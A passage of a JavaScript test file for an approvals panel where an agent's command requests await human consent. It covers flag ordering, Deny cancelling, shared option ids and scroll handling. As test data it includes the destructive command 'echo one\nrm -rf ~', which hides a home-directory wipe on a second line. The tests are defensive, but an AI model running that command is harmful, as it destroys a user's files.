  assert.ok(whole.includes(`class="dp-row-why" aria-label="${escaped(`${LINE_2O} Show raw is in the pane.`)}"`), 'and its mark carries the line alone')
  assert.equal(tile.split(SENT).length - 1, 1, tile)
  assert.ok(pane.includes('<span class="ap-flag">not as sent</span>'), pane)
  bind.resetHolds()
})

// be2p ruling 4: in the pane's list "not as sent" stands before the flag. The cell is 104 px wide and cuts its end, and a flag is a
// sentence, so the words that gate the answer are the ones that stay. (Drawn at the cell's width in approvals-drawn-be2p.test.mjs.)
test('in the pane\'s list "not as sent" stands before a flag, and before "urgent" (be2p ruling 4)', () => {
  bind.resetHolds()
  const input = {session: SESSION, encounter: encounter([CONSENT]), holds: bind.chainHolds()}
  const binding = rec.approvalsBinding(input, {permission: async () => {}})
  const queue = JSON.stringify([{id: 'a', kind: 'request', who: 'Kite', text: 'rm', flag: 'Held past its Wait: nobody answered', differs: LINE_2O}, {id: 'b', kind: 'request', who: 'Kite', text: 'ls', urgent: true, differs: LINE_2O},
    {id: 'c', kind: 'request', who: 'Kite', text: 'ls', flag: 'recursive delete'}, {id: 'd', kind: 'request', who: 'Kite', text: 'ls', differs: LINE_2O}])
  const pane = hosted(approvalsDesign, {...binding, values: {...binding.values, queue, pick: 'a', follow: false}})[views.indexOf('full')]
  assert.deepEqual([...pane.matchAll(/<span class="ap-flag">([^<]*)<\/span>/g)].map(match => match[1]).sort(),
    ['not as sent', 'not as sent \u{b7} Held past its Wait: nobody answered', 'not as sent \u{b7} urgent', 'recursive delete'])
  bind.resetHolds()
})

// ── be2q (DLW build ruling 2026-11-11): the follow-ups of the review of O-I #970 ─────────────────────────────────────────────────────
// Ruling 3: where a request offers no refusing choice, Approvals' Deny sends the cancelled outcome. The binding, which sends it, hands
// the line that says so on the request's row, and every face draws it in standing words beside Deny and in Deny's own words for the Info
// line. A request that offers a refusal, and a decision in its owner's words, carry no such line. Ruling 5: an id a refusal shares with
// an allow is not sent by Deny.
test('where Deny will cancel, the row says so and every face draws it beside Deny; Deny never sends an id an allow also holds (be2q rulings 3, 5)', async () => {
  const DENY_CANCELS = 'Deny cancels the request: it offers no refusing choice.'
  const SHARED = [{option_id: 'x', kind: 'allow_once', label: 'Yes'}, {option_id: 'x', kind: 'reject_once', label: 'No'}]
  const cases = {allowNow: DENY_CANCELS, mixed: DENY_CANCELS, onlyYes: DENY_CANCELS, kinds: undefined, alwaysOnly: undefined, shared: DENY_CANCELS}
  // Each on a plain command, and on one not shown as sent, where the whole view and the tile have Read as sent in Approve's place.
  for (const [name, line] of Object.entries(cases)) for (const command of ['ls', 'echo one\nrm -rf ~']) {
    const choices = name === 'shared' ? SHARED : CHOICES_2P[name]
    assert.equal(rec.queueRows([asking2p('req-k', choices, command)], SESSION)[0].denySays, line, `${name}: the row`)
    for (const view of ['whole', 'widget', 'full']) {
      bind.resetHolds(); host.resetHost()
      const sent = []
      const input = {session: SESSION, encounter: encounter([asking2p('req-k', choices, command)]), holds: bind.chainHolds()}
      const binding = rec.approvalsBinding(input, {permission: async (id, decision) => { sent.push(decision) }})
      assert.equal(actionsOf(nodesOf(approvalsDesign[view](propsOn(binding, picked(input, 'req-k')).p)), 'Read as sent').length, command !== 'ls' && view !== 'full' ? 1 : 0)
      const face = propsOn(binding, picked(input, 'req-k'))
      const markup = renderToStaticMarkup(createElement(() => approvalsDesign[view](face.p)))
      const drawn = [...markup.matchAll(/<(p|span) class="(?:ap-where )?ap-cancels"[^>]*>([^<]*)</g)].map(match => match[2])
      assert.deepEqual(drawn, line ? [line] : [], `${name}: ${view} draws the line beside Deny, once, or not at all`)
      const nodes = nodesOf(approvalsDesign[view](face.p))
      const does = view === 'full' ? buttonsOf(nodes, 'Deny')[0].props['data-i'] : actionsOf(nodes, 'Deny')[0].props.does
      assert.equal(does.includes(DENY_CANCELS), !!line, `${name}: ${view} Deny's own words`)
      assert.equal(does.includes('Declines the request'), !line, `${name}: ${view} Deny does not say it declines where it cancels`)
      const p = {...face.p, set: (key, value) => { host.setHosted(binding, key, value) }}
      pressOf(view, nodesOf(approvalsDesign[view](p)), 'Deny')()
      await host.flushDrafts(binding)
      assert.deepEqual(sent, [line ? {outcome: 'cancelled'} : {outcome: 'selected', option_id: name === 'kinds' ? 'r' : 'never'}], `${name}: ${view} Deny sends what the line says`)
    }
  }
  // In the pane the line stands at the detail's foot with the answers, outside the part that scrolls, and "not as sent" with it.
  const two = asking2p('req-k', CHOICES_2P.onlyYes, 'echo one\nrm -rf ~')
  const input = {session: SESSION, encounter: encounter([two]), holds: bind.chainHolds()}
  const pane = renderToStaticMarkup(createElement(() => approvalsDesign.full(propsOn(rec.approvalsBinding(input, {}), picked(input, 'req-k')).p)))
  const read = pane.indexOf('class="ap-read"'), answer = pane.indexOf('class="ap-answer"'), foot = pane.slice(answer)
  assert.ok(read > 0 && answer > read, 'the scrolled part, then the answers')
  assert.match(foot, /^class="ap-answer"><p class="ap-said" role="note"><small class="ap-sent" data-i="Not as sent\|The command has 2 lines, drawn as one here\. Show raw has it as it was sent\.">not as sent<\/small><span class="ap-cancels">Deny cancels the request: it offers no refusing choice\.<\/span><\/p><div class="ap-do"><button/)
  const scrolled = pane.slice(read, answer)
  assert.ok(scrolled.includes('class="ap-note ap-differs"') && scrolled.includes('<details class="ap-raw" open="">') && !scrolled.includes('<button'), 'the line and the open raw form stand in the scrolled part, and no answer does')
  assert.match(pane, /<div class="ap-read" role="group" aria-label="The item chosen" tabindex="0">/, 'a keyboard reaches the scrolled part')
  // A decision in its owner's words is not a consent request: nothing is said of cancelling.
  const unit = JSON.stringify([{id: 'u', kind: 'request', who: 'Factory', text: 'Resume?', options: {allowOnce: 'Resume', deny: 'Cancel'}, denySays: DENY_CANCELS}])
  for (const view of ['whole', 'widget', 'full'])
    assert.ok(!renderToStaticMarkup(createElement(() => approvalsDesign[view]({v: {queue: unit, pick: 'u', light: 'lit'}, owner: {}, set() {}, nav: {}, page: 'queue', setPage() {}, standing: {}}))).includes('ap-cancels'), view)
  host.resetHost(); bind.resetHolds()
})

// be2s ruling 5 (DLW build ruling 2026-11-12; the review of O-I #972, F6): Approvals' Approve never sends an id that a choice of
// another kind holds too, as its Deny never does: the press is refused in words and nothing leaves. An allow for this time under an
// id of its own is sent.
test('Approvals\' Approve never sends an id that a choice of another kind also holds (be2s ruling 5)', async () => {
  const NO_ONCE = 'The request offers no once choice; answer it in the thread pane.'
  const of = (...list) => list.map(([option_id, kind]) => ({option_id, kind, label: kind}))
  const cases = [
    ['an allow for this time and an always-allow of one id', of(['x', 'allow_once'], ['x', 'allow_always'], ['r', 'reject_once']), [[], NO_ONCE]],
    ['an allow and a reject of one id', of(['x', 'reject_once'], ['x', 'allow_once']), [[], NO_ONCE]],
    ['a shared id beside an allow for this time of its own', of(['x', 'allow_once'], ['x', 'allow_always'], ['y', 'allow_once']), [[{outcome: 'selected', option_id: 'y'}], null]],
    ['two allows for this time of one id', of(['x', 'allow_once'], ['x', 'allow_once']), [[{outcome: 'selected', option_id: 'x'}], null]],
  ]
  for (const [name, choices, expected] of cases) for (const view of ['whole', 'full']) {
    bind.resetHolds(); host.resetHost()
    const sent = []
    const input = {session: SESSION, encounter: encounter([asking2p('req-k', choices)]), holds: bind.chainHolds()}
    const binding = rec.approvalsBinding(input, {permission: async (id, decision) => { sent.push([id, decision]) }})
    const face = propsOn(binding, picked(input, 'req-k'))
    const p = {...face.p, set: (key, value) => { face.sets.push([key, value]); host.setHosted(binding, key, value) }}
    pressOf(view, nodesOf(approvalsDesign[view](p)), 'Approve')()
    assert.deepEqual(face.sets, [['allowOnce', 'req-k']], `${name}: ${view} Approve names its request`)
    const refusal = await host.flushDrafts(binding)
    assert.deepEqual([sent.map(call => call[1]), refusal], expected, `${name}: ${view} Approve`)
  }
  host.resetHost(); bind.resetHolds()
})

// be2s ruling 2 (DLW build ruling 2026-11-12; the review of O-I #972, F2): one turn of the wheel over a part that scrolls inside a
// pane that itself scrolls. Down: the pane first, to its end, then the part. Up: the part first, to its top, then the pane. A
// turn goes whole to the one that can move, never more than it can still move, and the rest of it is dropped.
test('a wheel over the request moves the pane down first and the request after; back up, the request first (be2s ruling 2)', async () => {
  const {wheelShares, shortSays} = await import('../src/inhabitants/catalogue/panels/software-factory__approvals.tsx')
  // [the turn, what the pane can still move that way, what the part can] -> [the pane's share, the part's]
  for (const [dy, pane, part, expected] of [
    [100, 60, 10000, [60, 0]], [100, 300, 10000, [100, 0]], [100, 0, 10000, [0, 100]], [100, 0, 30, [0, 30]], [100, 20, 30, [20, 0]], [100, 0, 0, [0, 0]],
    [-100, 60, 40, [0, -40]], [-100, 60, 10000, [0, -100]], [-100, 60, 0, [-60, 0]], [-100, 300, 0, [-100, 0]], [-100, 0, 0, [0, 0]], [-30, 60, 10, [0, -10]],
    [2.5, 1, 9, [1, 0]], [100, -3, 50, [0, 50]], [-100, 50, -2, [-50, 0]],
  ]) { const got = wheelShares(dy, pane, part); assert.deepEqual([got.pane + 0, got.part + 0], expected, `a turn of ${dy} with ${pane} px of pane and ${part} px of the part left`) }
  assert.equal(shortSays('Approve'), 'No room here to read it beside Approve. Make the window or the pane taller.')
})
